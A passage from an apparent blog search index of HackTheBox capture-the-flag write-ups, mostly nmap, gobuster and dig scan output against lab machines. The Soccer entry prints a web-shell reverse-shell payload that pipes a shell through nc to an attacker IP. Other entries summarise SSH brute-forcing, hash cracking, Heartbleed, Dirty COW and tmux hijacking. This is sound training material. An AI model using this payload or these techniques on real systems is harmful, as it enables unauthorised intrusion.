2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/shocker/images/shocker.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/shocker/","summary":"Shocker Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.56 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 20:39 BST Nmap scan report for 10.10.10.56 (10.10.10.56) Host is up (0.15s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed.","tags":["HTB"],"title":"[HTB] Machine: Shocker"},{"categories":null,"contents":"Soccer Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p22,80,9091 -sC -sV 10.10.11.194 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 11:38 EDT Nmap scan report for www.soccer.htb (10.10.11.194) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) |_ 256 5797565def793c2fcbdb35fff17c615c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ 9091/tcp open xmltec-xmlmail? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src \u0026#39;none\u0026#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 139 | Date: Mon, 15 May 2023 15:38:17 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;pre\u0026gt;Cannot GET /\u0026lt;/pre\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | HTTPOptions, RTSPRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src \u0026#39;none\u0026#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Mon, 15 May 2023 15:38:18 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;pre\u0026gt;Cannot OPTIONS /\u0026lt;/pre\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9091-TCP:V=7.93%I=7%D=5/15%Time=646251FC%P=x86_64-pc-linux-gnu%r(in SF:formix,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r SF:\\n\\r\\n\u0026#34;)%r(drda,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x SF:20close\\r\\n\\r\\n\u0026#34;)%r(GetRequest,168,\u0026#34;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\ SF:nContent-Security-Policy:\\x20default-src\\x20\u0026#39;none\u0026#39;\\r\\nX-Content-Type-Op SF:tions:\\x20nosniff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nCo SF:ntent-Length:\\x20139\\r\\nDate:\\x20Mon,\\x2015\\x20May\\x202023\\x2015:38:17\\ SF:x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20lang SF:=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt;\\n\u0026lt;/ SF:head\u0026gt;\\n\u0026lt;body\u0026gt;\\n\u0026lt;pre\u0026gt;Cannot\\x20GET\\x20/\u0026lt;/pre\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(HT SF:TPOptions,16C,\u0026#34;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Pol SF:icy:\\x20default-src\\x20\u0026#39;none\u0026#39;\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\n SF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\ SF:r\\nDate:\\x20Mon,\\x2015\\x20May\\x202023\\x2015:38:18\\x20GMT\\r\\nConnection: SF:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\u0026lt;me SF:ta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt;\\n\u0026lt;/head\u0026gt;\\n\u0026lt;body\u0026gt;\\n\u0026lt;pre\u0026gt;C SF:annot\\x20OPTIONS\\x20/\u0026lt;/pre\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(RTSPRequest,16C,\u0026#34;HT SF:TP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Policy:\\x20default-s SF:rc\\x20\u0026#39;none\u0026#39;\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nContent-Type:\\x20 SF:text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r\\nDate:\\x20Mon,\\ SF:x2015\\x20May\\x202023\\x2015:38:18\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n SF:\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\u0026lt;meta\\x20charset=\\\u0026#34;u SF:tf-8\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt;\\n\u0026lt;/head\u0026gt;\\n\u0026lt;body\u0026gt;\\n\u0026lt;pre\u0026gt;Cannot\\x20OPTIONS\\ SF:x20/\u0026lt;/pre\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(RPCCheck,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad SF:\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(DNSVersionBindReqTCP,2F SF:,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)% SF:r(DNSStatusRequestTCP,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnect SF:ion:\\x20close\\r\\n\\r\\n\u0026#34;)%r(Help,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(SSLSessionReq,2F,\u0026#34;HTTP/1\\.1\\x20400\\x SF:20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.90 seconds gobuster â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://soccer.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/15 11:42:17 Starting gobuster in directory enumeration mode =============================================================== /tiny (Status: 301) [Size: 178] [--\u0026gt; http://soccer.htb/tiny/] Progress: 20713 / 26585 (77.91%)[ERROR] 2023/05/15 11:47:19 [!] parse \u0026#34;http://soccer.htb/error\\x1f_log\u0026#34;: net/url: invalid control character in URL Progress: 26570 / 26585 (99.94%) =============================================================== 2023/05/15 11:48:36 Finished =============================================================== Web Server Foothold Let\u0026rsquo;s try default credentials since we know the application running Let\u0026rsquo;s try uploading file with php extension to get rce It seems like there is a cleanup job, that deletes/moves the uploaded files Thus, I tried adding web shell to existing files But had no success, because the changes were reverted back So now we have a approximately 1 minute window to upload and get our reverse shell before our file gets deleted Prepared payload request beforehand: GET /tiny/uploads/shell.php?cmd=rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2\u0026gt;%261|nc+10.10.16.37+6666+\u0026gt;/tmp/f Upload php file and send our request And we get our foothold User Now let\u0026rsquo;s enumerate Let\u0026rsquo;s use linpeas Nothing interesting was found, except another vhost Let\u0026rsquo;s add it to our /etc/hosts and open it Let\u0026rsquo;s check it We see that there are websockets involved in ticket input form So I played around with few basic sqli, but no success I can try using sqlmap but have no idea how to send requests to websocket Luckily there is a great blog about it Thanks to rayhan0x01 Check his blog out Now we can use sqlmap Use the creds dumped by sqlmap and we have our user Root If you ran linpeas before, you probably saw doas binary If search for it\u0026rsquo;s config, you will find that it has permissions for player to run dstat as root Check GTFOBins And get your root ","date":"June 7, 2023","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/soccer/","summary":"Soccer Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p22,80,9091 -sC -sV 10.10.11.194 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 11:38 EDT Nmap scan report for www.soccer.htb (10.10.11.194) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) |_ 256 5797565def793c2fcbdb35fff17c615c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.","tags":["HTB"],"title":"[HTB] Machine: Soccer"},{"categories":null,"contents":"Sunday Enumeration nmap â””â”€$ nmap -sT -p- -Pn --min-rate 5000 10.10.10.76 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:09 BST Warning: 10.10.10.76 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.76 (10.10.10.76) Host is up (0.094s latency). Not shown: 63025 filtered tcp ports (no-response), 2505 closed tcp ports (conn-refused) PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 515/tcp open printer 6787/tcp open smc-admin 22022/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 142.50 seconds â””â”€$ nmap -sC -sV -p79,111,515,6787,22022 10.10.10.76 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:37 BST Nmap scan report for 10.10.10.76 (10.10.10.76) Host is up (0.16s latency). PORT STATE SERVICE VERSION 79/tcp open finger? | fingerprint-strings: | GenericLines: | No one logged on | GetRequest: | Login Name TTY Idle When Where | HTTP/1.0 ??? | HTTPOptions: | Login Name TTY Idle When Where | HTTP/1.0 ??? | OPTIONS ??? | Help: | Login Name TTY Idle When Where | HELP ??? | RTSPRequest: | Login Name TTY Idle When Where | OPTIONS ??? | RTSP/1.0 ??? | SSLSessionReq, TerminalServerCookie: |_ Login Name TTY Idle When Where |_finger: No one logged on\\x0D 111/tcp open rpcbind 2-4 (RPC #100000) 515/tcp open printer 6787/tcp open ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14) | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=sunday | Subject Alternative Name: DNS:sunday | Not valid before: 2021-12-08T19:40:00 |_Not valid after: 2031-12-06T19:40:00 | http-title: Solaris Dashboard |_Requested resource was https://10.10.10.76:6787/solaris/ 22022/tcp open ssh OpenSSH 7.5 (protocol 2.0) | ssh-hostkey: | 2048 aa0094321860a4933b87a4b6f802680e (RSA) |_ 256 da2a6cfa6bb1ea161da654a10b2bee48 (ED25519) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port79-TCP:V=7.93%I=7%D=6/10%Time=64846E88%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,12,\u0026#34;No\\x20one\\x20logged\\x20on\\r\\n\u0026#34;)%r(GetRequest,93,\u0026#34;Login\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x2 SF:0\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nGET\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\ SF:?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:?\\?\\?\\r\\n\u0026#34;)%r(Help,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\nHELP\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\?\\?\\?\\r\\n\u0026#34;)%r(HTTPOptions,93,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\ SF:r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(RTSPRequest,93,\u0026#34;Login\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x2 SF:0When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nRTSP/1\\.0\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(SS SF:LSessionReq,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n\\x16\\x03\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(TerminalServerCookie,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20 SF:\\x20\\x20Where\\r\\n\\x03\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 108.42 seconds Web Server We have a finger service, we can try enumerating users Foothold Let\u0026rsquo;s try bruteforcing ssh, since I had no idea where to check next Guess the password or use hydra We\u0026rsquo;re in, the creds are sunny:sunday User Let\u0026rsquo;s enumerate for privesc We have another user: sammy And we have a /backup folder with shadow file Let\u0026rsquo;s crack hashes using hashcat And we have our creds for sammy Root Enumerate for privesc sudo -l Check GTFOBins Rooted ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/sunday/images/sunday.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/sunday/","summary":"Sunday Enumeration nmap â””â”€$ nmap -sT -p- -Pn --min-rate 5000 10.10.10.76 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:09 BST Warning: 10.10.10.76 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.76 (10.10.10.76) Host is up (0.094s latency). Not shown: 63025 filtered tcp ports (no-response), 2505 closed tcp ports (conn-refused) PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 515/tcp open printer 6787/tcp open smc-admin 22022/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 142.","tags":["HTB"],"title":"[HTB] Machine: Sunday"},{"categories":null,"contents":"Valentine Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.79 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 19:16 BST Nmap scan report for 10.10.10.79 (10.10.10.79) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 964c51423cba2249204d3eec90ccfd0e (DSA) | 2048 46bf1fcc924f1da042b3d216a8583133 (RSA) |_ 256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US | Not valid before: 2018-02-06T00:45:25 |_Not valid after: 2019-02-06T00:45:25 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.2.22 (Ubuntu) |_ssl-date: 2023-06-07T18:16:21+00:00; -29s from scanner time. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: -29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.79 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/07 20:00:19 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 38] /index (Status: 200) [Size: 38] /dev (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.79/dev/] /encode (Status: 200) [Size: 554] /encode.php (Status: 200) [Size: 554] /decode.php (Status: 200) [Size: 552] /decode (Status: 200) [Size: 552] /omg (Status: 200) [Size: 153356] /server-status (Status: 403) [Size: 292] Check dev endpoint Check the content of the files We have a note And a key, which could belong to hype user (since the filename indicates it) Foothold/User Both web server host same image and look identical The picture suggests heartbleed So googling resulted: https://heartbleed.com/ https://xkcd.com/1354/ etc. Let\u0026rsquo;s search for exploit Test the exploit We see that it\u0026rsquo;s vulnerable Let\u0026rsquo;s remove zeros from output Now we need to dump the memory Found a script You can modify the length within the exploit, in case you want to play with it Let\u0026rsquo;s launch the script We might have to launch it few times And we get some results You can use the decoder from the decode endpoint on the webserver or base64 tool Let\u0026rsquo;s also check the key file from the dev endpoint Download it and use xxd tool to reverse the hexdump Okay, it looks like it\u0026rsquo;s a rsa key, we can use to connect via ssh Root Let\u0026rsquo;s enumerate for privesc Upload linpeas Scan the results We see that we can try dirty cow exploit, since it\u0026rsquo;s an old box The list of processes indicate opened session in tmux We can try tmux session hijacking So let\u0026rsquo;s escalate privileges And get a root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/valentine/images/valentine.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/valentine/","summary":"Valentine Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.79 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 19:16 BST Nmap scan report for 10.10.10.79 (10.10.10.79) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 964c51423cba2249204d3eec90ccfd0e (DSA) | 2048 46bf1fcc924f1da042b3d216a8583133 (RSA) |_ 256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Valentine"},{"categories":null,"contents":"Bank Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.10.29 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 16:18 BST Nmap scan report for 10.10.10.29 (10.10.10.29) Host is up (0.12s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08eed030d545e459db4d54a8dc5cef15 (DSA) | 2048 b8e015482d0df0f17333b78164084a91 (RSA) | 256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA) |_ 256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519) 53/tcp open domain ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.01 seconds dig â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ dig AXFR bank.htb @10.10.10.29 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.12-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; AXFR bank.htb @10.10.10.29 ;; global options: +cmd bank.htb. 604800 IN SOA bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800 bank.htb. 604800 IN NS ns.bank.htb. bank.htb. 604800 IN A 10.10.10.29 ns.bank.htb. 604800 IN A 10.10.10.29 www.bank.htb. 604800 IN CNAME bank.htb. bank.htb. 604800 IN SOA bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800 ;; Query time: 231 msec ;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP) ;; WHEN: Tue Jun 06 16:43:22 BST 2023 ;; XFR size: 6 records (messages 1, bytes 171) After adding records to /etc/hosts â””â”€$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 16:46:01 Starting gobuster in directory enumeration mode =============================================================== /login.php (Status: 200) [Size: 1974] /index.php (Status: 302) [Size: 7322] [--\u0026gt; login.php] /logout.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /.htaccess (Status: 403) [Size: 284] /. (Status: 302) [Size: 7322] [--\u0026gt; login.php] /.html (Status: 403) [Size: 280] /support.php (Status: 302) [Size: 3291] [--\u0026gt; login.php] /.php (Status: 403) [Size: 279] /.htpasswd (Status: 403) [Size: 284] /.htm (Status: 403) [Size: 279] /.htpasswds (Status: 403) [Size: 285] /.htgroup (Status: 403) [Size: 283] /wp-forum.phps (Status: 403) [Size: 288] /.htaccess.bak (Status: 403) [Size: 288] /.htuser (Status: 403) [Size: 282] /.ht (Status: 403) [Size: 278] /.htc (Status: 403) [Size: 279] /dispatch.fcgi (Status: 403) [Size: 288] /mytias.fcgi (Status: 403) [Size: 286] /test.fcgi (Status: 403) [Size: 284] Progress: 16243 / 16245 (99.99%) â””â”€$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 16:49:19 Starting gobuster in directory enumeration mode =============================================================== /inc (Status: 301) [Size: 301] [--\u0026gt; http://bank.htb/inc/] /uploads (Status: 301) [Size: 305] [--\u0026gt; http://bank.htb/uploads/] /assets (Status: 301) [Size: 304] [--\u0026gt; http://bank.htb/assets/] /server-status (Status: 403) [Size: 288] gobuster â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: 